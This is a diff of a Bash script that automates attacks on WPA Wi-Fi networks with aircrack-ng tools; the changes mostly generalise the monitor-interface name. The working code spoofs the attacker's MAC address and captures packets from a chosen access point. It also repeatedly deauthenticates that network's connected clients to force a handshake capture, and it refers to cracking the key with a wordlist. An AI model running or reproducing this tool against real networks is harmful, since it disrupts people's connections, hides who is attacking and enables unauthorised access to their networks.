@@ -2,6 +2,7 @@
 
 # TODO: 
 # - write PIN + key to file with Perl after PIN recovery
+
 WIRELESS_INTERFACE="wlan0";
 
 ################# FUNCTIONS ##############
@@ -23,13 +24,19 @@ getWifiCardDriver(){
     lshw -c network | gawk '!/wireless/ || !/driver/{ next; } { while(++i<=NF){ if($i ~ /driver\=/){ sub("driver=","",$i); print $i; } } }';
 }
 
+# tries to extract monitor name from the ifconfig output
+getMonitorName(){
+    ifconfig | perl -lane '{ if(/^[^\s]*mon/){ $_ =~ s/\s+.*//; print $_; } }'
+}
+
 resetWifiCard(){
   local WIFI_DRIVER=$(getWifiCardDriver);
   local RESET_CARD_DRIVER_CMD="";
   if [[ -z "$WIFI_DRIVER" ]]; then
 	echoBlue "Sorry couldn't get your WifiDriver";
 	echoBlue "Check if any wifi card is connected and try again";
-	echoBlue "You have to check getWifiCardDriver() function on your own...";
+	echoBlue "You may try to reconnect your wifi card to USB port, and try again.";
+	echoBlue "If above solutions doesn't work, you have to check getWifiCardDriver() function on your own...";
 	exit;
   else 
 	echoBlue "I found that your WIFI driver is $WIFI_DRIVER ";
@@ -42,26 +49,32 @@ resetWifiCard(){
 stopMonitor() {
 	  echoGreen "killall airodump-ng" && killall airodump-ng &>/dev/null;
 	  echoGreen "killall aireplay-ng" && killall aireplay-ng &>/dev/null;
-	  echoGreen "airmon-ng stop mon0" && airmon-ng stop mon0;
-	  echoGreen "airmon-ng stop $WIRELESS_INTERFACE" && airmon-ng stop $WIRELESS_INTERFACE;
-	  echoGreen "airmon-ng check kill" && airmon-ng check kill;
+	  if [[ ! -z "$MONITOR_NAME" ]]; then
+	      echoGreen "airmon-ng stop $MONITOR_NAME" && airmon-ng stop $MONITOR_NAME;
+	      echoGreen "airmon-ng stop $WIRELESS_INTERFACE" && airmon-ng stop $WIRELESS_INTERFACE;
+	      echoGreen "airmon-ng check" && airmon-ng check;
+	  fi
 }
+
+startMonitor(){
+      echoGreen "airmon-ng start $WIRELESS_INTERFACE" && airmon-ng start $WIRELESS_INTERFACE
+}
+
 restartMonitor() {
       stopMonitor;
-      echoGreen "airmon-ng start $WIRELESS_INTERFACE" && airmon-ng start $WIRELESS_INTERFACE;
+      startMonitor;
 }
 
 changeMacTo(){
-      echoBlue "ifconfig mon0 down" && ifconfig mon0 down;
-      echoBlue "macchanger -m $1 mon0" && macchanger -m $1 mon0;
-      echoBlue "ifconfig mon0 up" && ifconfig mon0 up;
+      echoBlue "ifconfig $MONITOR_NAME down" && ifconfig $MONITOR_NAME down;
+      echoBlue "macchanger -m $1 $MONITOR_NAME" && macchanger -m $1 $MONITOR_NAME;
+      echoBlue "ifconfig $MONITOR_NAME up" && ifconfig $MONITOR_NAME up;
 }
 getRandomMac(){
       echo $(perl -e 'sub l{":".int(rand(9)).int(rand(9));}; print "02".l.l.l.l.l;');
 }
 
 ################# FUNCTIONS END ##########
-
 
 
 ############# PARSING OPTIONS #####################
@@ -104,18 +117,13 @@ if [ $HANDSHAKE_GRAB == 0 ] && [ ! -f "$WORDLIST_FILE" ]; then
 fi
 
 ############# PARSING OPTIONS END  ###############
+# try to get monitor name if it's already set ?
+MONITOR_NAME=$(getMonitorName);
+stopMonitor;
+resetWifiCard;
+startMonitor;
 
-resetWifiCard
-restartMonitor
-
-## use random mac (for safety)
-RANDOM_MAC=$(getRandomMac)
-changeMacTo $RANDOM_MAC;
-
-if [[ -z $(ifconfig | grep mon0) ]]; then
-  echo "Something is wrong, can't start monitor mode for wlan0";
-  exit;
-fi
+############################### SETUP VARS ####################
 
 CURRENT_DIR=$(pwd);
 #capitalize BSSID (in case user gives small letters)
@@ -130,13 +138,30 @@ TMP_WPA_HANDSHAKE_GRABBED="/tmp/WPA-Attack-handshake-grabbed_${BSSID_CLEAR}";
 NETWORK_CLIENT_MAC="";
 # Crack password using password file list
 KEY_FOUND_LOG="${CURRENT_DIR}/KEY_FOUND_${BSSID_CLEAR}";
+## use random mac (for safety)
+RANDOM_MAC=$(getRandomMac);
+MONITOR_NAME=$(getMonitorName);
+
+if [[ -z $(ifconfig | grep "$MONITOR_NAME") ]]; then
+  echoBlue "Something is wrong, can't start monitor mode for wlan0";
+  exit;
+fi
+
+
+if [[ -z "$MONITOR_NAME" ]]; then
+   echoBlue "Couldn't find monitor name from your ifconfig output! Can your wifi card work in monitor mode?";
+   echoBlue "Setup variable MONITOR_NAME to store proper name like: mon0, wlan0mon... etc.";
+   exit;
+fi
+
+##############################################################
 
 
 # spoofed mac ?
 if [[ ! -z "$SPOOFED_MAC" ]]; then
-  ifconfig mon0 down
-  macchanger -m $SPOOFED_MAC mon0
-  ifconfig mon0 up
+   changeMacTo "$SPOOFED_MAC"
+else 
+   changeMacTo "$RANDOM_MAC";
 fi
 
 if [[ ! -d $AIRODUMP_LOG_DIR ]]; then
@@ -156,7 +181,7 @@ fi
 
 ####################### LOGGING PACKETS BY AIRODUMP-NG ###########################################
 
-LOGGING_PACKETS='airodump-ng --showack --bssid='$BSSID' -c '$CHANNEL' -w '$BSSID_LOG' mon0 2>&1 \
+LOGGING_PACKETS='airodump-ng --showack --bssid='$BSSID' -c '$CHANNEL' -w '$BSSID_LOG' '$MONITOR_NAME' 2>&1 \
 		| perl -e '\'' 
 		    my @clientMacs="";
 		    while(<>){
@@ -181,7 +206,7 @@ LOGGING_PACKETS='airodump-ng --showack --bssid='$BSSID' -c '$CHANNEL' -w '$BSSID
 		    }
 		  '\''  ';
 konsole -hold -e /bin/sh -c "$LOGGING_PACKETS" 2>/dev/null;
-echoGreen "airodump-ng mon0 --bssid=$BSSID -c $CHANNEL -w $BSSID_LOG";
+echoGreen "airodump-ng $MONITOR_NAME --bssid=$BSSID -c $CHANNEL -w $BSSID_LOG";
 
 
 echoBlue "Waiting for clients and WPA-Handshake...";
@@ -191,7 +216,7 @@ while true; do
 	  NETWORK_CLIENTS_MAC=$(cat $TMP_CONNECTED_CLIENTS);
 	  for SINGLE_CLIENT in $NETWORK_CLIENTS_MAC; do 
 		# Deauthenticate single wireless client (force him to another connection and grab WPA Hanshake)
-		DEAUTH_CMD="aireplay-ng -0 10 -a $BSSID -c $SINGLE_CLIENT mon0";
+		DEAUTH_CMD="aireplay-ng -0 10 -a $BSSID -c $SINGLE_CLIENT $MONITOR_NAME";
 		echoBlue "Trying to deauthenticate connected client: $SINGLE_CLIENT ...";
 		echoGreen "$DEAUTH_CMD";
 		konsole -e /bin/sh -c "$DEAUTH_CMD" 2>/dev/null
